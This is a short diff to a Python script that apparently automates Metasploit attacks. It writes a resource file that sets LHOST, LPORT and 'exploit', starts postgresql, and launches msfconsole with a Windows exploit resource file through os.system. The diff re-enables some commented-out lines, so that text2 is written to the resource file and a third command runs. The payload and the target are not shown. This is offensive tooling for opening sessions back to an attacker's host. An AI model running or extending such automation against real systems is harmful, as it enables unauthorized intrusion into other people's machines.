@@ -29,9 +29,9 @@ show options\
 "set LPORT" ' {}'.format(LPORT) + '\n'
 "set LHOST"  " {}".format(LHOST) +  '\n' "exploit")
 
-#f.write('\n')
+f.write('\n')
 f.write(text1)
-#f.write(text2)
+f.write(text2)
 f.close()
 
 
@@ -42,4 +42,4 @@ com2 = ("msfconsole  -r /home/whoami/Desktop/Projects/Auto_E/windows_exploit.rc"
 process1 = os.system(com1)
 print ("[+] Starting postgresql service ")
 process2 = os.system(com2)
-#process3 =os.system(com3)
+process3 =os.system(com3)
